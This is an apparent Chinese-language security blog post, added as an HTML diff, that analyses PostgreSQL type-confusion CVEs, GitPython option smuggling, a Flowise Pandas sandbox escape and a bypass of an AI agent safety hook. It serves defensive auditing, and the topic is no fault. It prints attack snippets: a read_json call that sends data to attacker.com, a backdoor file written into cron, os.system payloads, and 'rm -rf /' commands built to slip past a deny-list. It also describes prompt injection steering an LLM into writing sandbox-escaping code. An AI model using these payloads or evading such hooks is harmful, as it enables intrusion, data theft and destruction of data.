@@ -1,0 +1,291 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>数据库内核类型混淆 + 沙箱逃逸簇：PostgreSQL 28 CVE 与 AI Agent 安全工具绕过 — DARKSEC</title>
+<meta name="description" content="PostgreSQL 28 CVE 类型系统内存破坏 + GitPython kwargs 选项走私 + Flowise Pandas 沙箱逃逸 + AI 安全工具检查器/执行器字符串差异绕过">
+<link rel="icon" href="data:image/svg+xml,<svg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 100 100'><text y='.9em' font-size='90'>🔐</text></svg>">
+<link href="https://fonts.googleapis.com/css2?family=Orbitron:wght@400;500;700;900&family=Inter:wght@300;400;500;600;700&family=JetBrains+Mono:wght@400;500&display=swap" rel="stylesheet">
+<link rel="stylesheet" href="/css/style.css">
+</head>
+<body>
+<div class="container">
+  <header>
+    <a href="/" class="logo">DARK<span>SEC</span></a>
+    <nav>
+      <a href="/">首页</a>
+      <a href="/posts/" class="active">文章</a>
+      <a href="/tags/">标签</a>
+      <a href="/about.html">关于</a>
+    </nav>
+    <button class="mobile-menu" onclick="document.querySelector('nav').classList.toggle('show')">☰</button>
+  </header>
+
+  <main>
+    <a href="/" class="back-link">← 返回首页</a>
+
+    <article>
+      <div class="article-header">
+        <div class="category">◆ 漏洞研究 / 集群分析</div>
+        <h1>数据库内核类型混淆 + 沙箱逃逸簇：当「安全边界上的语义分裂」成为系统性风险 🐱</h1>
+        <div class="article-meta">
+          <span>📅 2026-08-16</span>
+          <span>⏱ 15 min read</span>
+          <span>🏷 PostgreSQL / GitPython / Flowise / AI安全</span>
+        </div>
+      </div>
+
+      <div class="article-content">
+        <div class="toc">
+          <h4>◆ 目录</h4>
+          <ul>
+            <li><a href="#intro">引言：信任边界上的语义分裂</a></li>
+            <li><a href="#postgresql">PostgreSQL 28 CVE — 类型系统内存破坏</a></li>
+            <li><a href="#gitpython">GitPython kwargs 选项走私 — RCE</a></li>
+            <li><a href="#flowise">Flowise 沙箱逃逸 — Pandas 方法黑名单绕过</a></li>
+            <li><a href="#hookbridge">AI 安全工具检查器/执行器字符串差异</a></li>
+            <li><a href="#methodology">共性方法论：能力清单审计法</a></li>
+          </ul>
+        </div>
+
+        <h2 id="intro">引言：信任边界上的语义分裂 ⚡</h2>
+        <p>今天分析的四个漏洞簇，表面上毫无关联——数据库内核、Git CLI 封装库、AI 工作流平台、AI 安全工具。但它们共享一个深层共性：<strong>安全边界上的语义分裂</strong>。</p>
+        <blockquote>
+          <p>每当一个组件用「一种语义」理解数据，另一个组件用「另一种语义」执行同一数据，中间必有绕过窗口。</p>
+        </blockquote>
+        <p>这个洞察可以指导未来所有审计——不是找「某个具体漏洞」，而是找「语义解释不一致」的边界。</p>
+
+        <h2 id="postgresql">🐘 PostgreSQL 28 CVE — 对象创建者触发类型系统内存破坏</h2>
+
+        <h3>背景</h3>
+        <p>PostgreSQL 2026-08-13 季度安全更新一次性披露了约 <strong>28 个 CVE</strong>，其中约 16 个可直接 RCE 或权限提升。传统上我们把数据库攻击面等同于「SQL注入」和「权限配置错误」，但这一簇揭示了完全不同的维度：<strong>数据库的类型系统本身</strong>。</p>
+
+        <h3>核心攻击面：对象创建者 ≠ Superuser</h3>
+        <p>关键发现：普通用户（<code>object creator</code>，非 superuser）就能触发这些漏洞。这意味着任何拥有 <code>CREATE</code> 权限的角色都是攻击者。</p>
+
+        <pre><code>-- CVE-2026-14680: internal 类型混淆
+-- internal 类型「本不应从 SQL 访问」，但防御存在 gap
+CREATE FUNCTION evil() RETURNS internal AS $$
+  SELECT 1::internal;  -- 类型混淆：internal 本不该被用户触达
+$$ LANGUAGE SQL;
+
+-- CVE-2026-14623/14624: tsvector/levenshtein 整数回绕
+-- 整数 wraparound → 分配变小 → OOB 写
+SELECT tsvector_update_trigger('tsvector_update_trigger', ...);
+-- 超长输入触发 integer wraparound → heap overflow
+
+-- CVE-2026-14634: regexp 经 pg_wchar 往返数据增长
+SELECT regexp_replace(lpad('a', 1000000, 'a'), ...);
+-- 宽字符转换后数据增长超出预期分配</code></pre>
+
+        <h3>漏洞类型分布</h3>
+        <ul>
+          <li><strong>Type confusion</strong>：CVE-2026-14680 — <code>internal</code> 类型本不应从 SQL 访问，但预防有 gap</li>
+          <li><strong>Integer wraparound</strong>：tsvector / levenshtein 整数回绕 → 分配变小 → OOB 写</li>
+          <li><strong>Heap overflow</strong>：regexp 经 pg_wchar 往返数据增长、to_char 长时区、plperl tied hash</li>
+          <li><strong>Deparse 层 SQL 注入</strong>：EXTRACT() deparse 生成可注入的 SQL</li>
+        </ul>
+
+        <h3>审计方法</h3>
+        <pre><code>-- 1. 检查版本
+SELECT version();
+-- 若 < 18.5 / 17.11 / 16.15 / 15.19 / 14.24，立即升级
+
+-- 2. 检查扩展模块（高风险 contrib）
+\dx
+-- 特别关注: amcheck, refint, pg_trgm, fuzzystrmatch, plperl, pltcl
+
+-- 3. 枚举类型函数 (*_in/*_out/*_recv)
+SELECT proname FROM pg_proc
+WHERE proname LIKE '%_in' OR proname LIKE '%_out'
+  OR proname LIKE '%_recv';
+
+-- 4. internal/opaque/pseudotype 参数 = 类型混淆入口
+SELECT proname, proargtypes::regtype[]
+FROM pg_proc
+WHERE proargtypes::text LIKE '%internal%';</code></pre>
+
+        <blockquote>
+          <p>💡 核心洞察：SQL 注入的表亲——攻击面在<strong>类型系统</strong>而非 SQL 语法。数据库的扩展模块（contrib）是最被忽视的富矿：社区贡献、审查少于核心、直接用 C 处理不可信输入。</p>
+        </blockquote>
+
+        <h2 id="gitpython">🔧 GitPython kwargs 选项走私 → RCE / 任意文件读写</h2>
+
+        <h3>来源</h3>
+        <p>CVE-2026-73620 / 73624 / 73625（GHSA, VulnCheck 2026-08-14）</p>
+
+        <h3>攻击链</h3>
+        <p>GitPython 封装 git CLI，通过 kwargs 传递选项。作者加了 <code>check_unsafe_options</code> 黑名单防御。但攻击者把危险选项<strong>走私进单字符 kwarg 值</strong>：</p>
+
+        <pre><code>import git
+
+# 正常用法
+repo = git.Repo.clone_from("https://github.com/user/repo", "/tmp/repo")
+
+# 攻击：--upload-pack 走私进单字符 kwarg
+# 黑名单检查 kwargs 时，单字符值绕过 pattern matching
+# 但拼入 argv 后变成完整选项
+repo = git.Repo.clone_from(
+    "https://github.com/user/repo",
+    "/tmp/repo",
+    o="--upload-pack=malicious_script"  # 单字符 'o' 绕过黑名单
+)
+
+# 结果：git clone https://... /tmp/repo --upload-pack=malicious_script
+# → 以当前用户权限执行 malicious_script → RCE
+
+# CVE-2026-73624: --prefix → 任意文件覆写
+# CVE-2026-73625: --output → 任意文件写
+# CVE-2026-73620: -F    → 任意文件读</code></pre>
+
+        <h3>根本原因</h3>
+        <p><strong>「kwargs 是数据」的假设在 CLI 边界失效</strong>——一旦拼进 argv 就成了「选项」。这是「命令行 -- 分隔符缺失注入」和「服务器→客户端命令注入」的<strong>库 API 变体</strong>。</p>
+
+        <h3>防御</h3>
+        <pre><code># ✅ 正确做法：allowlist + -- 分隔符
+subprocess.run(["git", "clone", "--", url, dest])
+
+# ❌ 错误做法：黑名单过滤 kwargs
+# 黑名单天然可绕过（单字符、等号、引号……）</code></pre>
+
+        <blockquote>
+          <p>💡 核心洞察：所有「库→CLI」封装（Docker SDK、kubectl 封装、subprocess 层）都是同类攻击面。<code>pip show gitpython</code> 看版本（&lt; 3.1.57 受影响）。</p>
+        </blockquote>
+
+        <h2 id="flowise">🤖 Flowise 沙箱逃逸 — Pandas 方法黑名单绕过 + Prompt Injection</h2>
+
+        <h3>来源</h3>
+        <p>CVE-2026-73483 ~ 73487 / 73601 / 73602（GHSA, VulnCheck 2026-08-14）</p>
+
+        <h3>攻击面分析</h3>
+        <p>Flowise 的 <code>pythonCodeValidator</code> 用静态 regex 黑名单过滤 Python 代码。但遗漏了 Pandas DataFrame 的<strong>合法</strong>方法：</p>
+
+        <pre><code># 黑名单遗漏的能力方法：
+df.to_csv("/etc/cron.d/backdoor")    # → 任意文件写
+df.to_json("/tmp/exfil")             # → 任意文件写
+df.read_json("https://attacker.com/exfil?data=" + df.to_json())
+                                     # → SSRF + 数据外带
+df.pipe(lambda x: os.system("id"))   # → 命令执行
+df.query("@__import__('os').system('id')")  # → 表达式注入</code></pre>
+
+        <h3>完整攻击链</h3>
+        <ol>
+          <li>Prompt injection 让 LLM 生成含 <code>to_csv</code> / <code>read_json</code> 的 Python 代码</li>
+          <li>代码通过 <code>pythonCodeValidator</code> 的 regex 黑名单（合法方法不在黑名单中）</li>
+          <li>未认证 API 直接执行 → SSRF / 任意文件读写</li>
+          <li>额外：Puppeteer <code>launch(executablePath, args)</code> 参数注入逃逸 vm2 沙箱</li>
+        </ol>
+
+        <h3>核心思维模型：能力清单 vs 黑名单</h3>
+        <pre><code># ❌ 黑名单思维（总是遗漏）
+BLOCKED = ["eval", "exec", "os.system", "subprocess", "open"]
+
+# ✅ 能力清单思维（覆盖全面）
+# 列出沙箱内所有可达 API 的「能力」：
+CAPABILITIES = {
+    "file_io": ["to_csv", "to_json", "read_json", "to_excel", "pipe"],
+    "network": ["read_json(远程URL)", "requests.get"],
+    "subprocess": ["pipe(自定义函数)", "apply(自定义函数)"],
+}
+# → 逐项测试过滤是否覆盖了这些能力</code></pre>
+
+        <blockquote>
+          <p>💡 核心洞察：能力思维 vs 黑名单思维——按「函数名」过滤，能力却藏在「合法 API」里。所有 AI 平台 Python 沙箱的通用审计法：列「能力方法」而非「危险方法」。</p>
+        </blockquote>
+
+        <h2 id="hookbridge">🔍 AI 安全工具检查器/执行器字符串差异绕过</h2>
+
+        <h3>来源</h3>
+        <p>CVE-2026-73614 / 73615（ClaudeHookBridge, VulnCheck 2026-08-14）</p>
+
+        <h3>漏洞：匹配用的字符串 ≠ 执行用的字符串</h3>
+        <p>AI Agent 安全 hook 的 <code>denyPatterns</code> 存在两个致命差异：</p>
+
+        <pre><code># 差异1：截断
+# denyPatterns 评估前把命令截断到 500 字符
+# 但执行器执行完整命令
+
+# 攻击：
+cmd = "echo hello" + "A" * 480 + "\nrm -rf /"
+# 匹配器看到: "echo hello" + "A" * 480  → 安全 ✅
+# 执行器执行: 完整字符串 → RCE 💀
+
+# 差异2：引号剥离
+# SandboxPolicy 保留引号匹配 raw 命令
+# 执行器 strip 引号后 tokenize
+
+# 攻击：
+cmd = '"rm" -rf /'
+# 匹配器看到: '"rm" -rf /'  → rm 在引号内 → 不匹配 blocklist ✅
+# 执行器执行: rm -rf /     → RCE 💀</code></pre>
+
+        <h3>同族漏洞模式</h3>
+        <p>这与「反向代理原始 URI vs 规范化 URI 绕过」同族——都是「检查用的表示 ≠ 执行用的表示」。具体来说：</p>
+        <ul>
+          <li>反向代理：原始请求路径 vs 规范化路径</li>
+          <li>WAF：URL 编码前 vs 解码后的 payload</li>
+          <li>本次：截断/引号剥离前 vs 后的命令字符串</li>
+        </ul>
+
+        <blockquote>
+          <p>💡 核心洞察：任何「先检查后执行」的 denylist 边界都存在此风险。审计方法：对比 denyPattern 匹配输入与执行输入是否同一份 → 测截断长度 + 引号包裹。</p>
+        </blockquote>
+
+        <h2 id="methodology">🧠 共性方法论：能力清单审计法</h2>
+
+        <p>今天的四条技法提炼出一个可复用的审计框架：</p>
+
+        <h3>「语义分裂」检测清单</h3>
+        <ol>
+          <li><strong>权限边界</strong>：对象创建者 vs superuser（PostgreSQL）</li>
+          <li><strong>数据/控制边界</strong>：kwargs 数据 vs CLI 选项（GitPython）</li>
+          <li><strong>函数名/能力边界</strong>：合法方法名 vs 实际能力（Flowise Pandas）</li>
+          <li><strong>检查/执行边界</strong>：匹配字符串 vs 执行字符串（ClaudeHookBridge）</li>
+        </ol>
+
+        <h3>「能力清单」审计法（通用）</h3>
+        <pre><code># 对任何沙箱/过滤器/安全检查：
+# 1. 列出所有可达 API 的「能力」（而非「危险方法名」）
+# 2. 分类：文件IO / 子进程 / 网络 / 类加载 / 反射
+# 3. 逐项测试：过滤器是否真正覆盖了该能力？
+# 4. 特别检查：过滤器看到的输入 ≠ 执行器执行的输入？
+
+# PostgreSQL 版本：
+# 列出所有可达的类型函数（*_in/*_out/*_recv）
+# → 检查哪些函数接受 internal/opaque 参数
+# → 测试 object creator 权限是否能调用
+
+# GitPython 版本：
+# 列出所有接受 kwargs 的函数
+# → 追踪 kwargs 如何拼入 argv
+# → 测试单字符值走私、等号走私、引号走私</code></pre>
+
+        <h3>实战建议 🎯</h3>
+        <ol>
+          <li><strong>立刻检查 PostgreSQL 版本</strong>：<code>SELECT version();</code> 若 &lt; 18.5/17.11/16.15/15.19/14.24 立即升级；<code>\dx</code> 检查 amcheck/refint/pg_trgm/fuzzystrmatch/plperl/pltcl 扩展</li>
+          <li><strong>GitPython 依赖审计</strong>：<code>pip show gitpython</code> 看版本（&lt; 3.1.57 受影响），grep 代码里 <code>clone_from</code>/<code>diff</code>/<code>checkout</code>/<code>pull</code> 的 kwargs 是否来自用户输入</li>
+          <li><strong>AI 平台 Python 沙箱审计</strong>：用「能力清单」替代黑名单——列出所有 Pandas/NumPy/标准库的 IO/网络/子进程方法，确认过滤器全覆盖</li>
+        </ol>
+
+        <div class="article-tags">
+          <span class="tag pink">PostgreSQL</span>
+          <span class="tag cyan">类型混淆</span>
+          <span class="tag green">GitPython</span>
+          <span class="tag">沙箱逃逸</span>
+          <span class="tag purple">AI安全</span>
+          <span class="tag yellow">CVE分析</span>
+        </div>
+      </div>
+    </article>
+  </main>
+
+  <footer>
+    <div class="footer-content">
+      <p>~ 感谢阅读 nya~ 🐱✨</p>
+      <p>© 2026 <span class="neon-text">DARKSEC</span> SECURITY LAB</p>
+    </div>
+  </footer>
+</div>
+</body>
+</html>
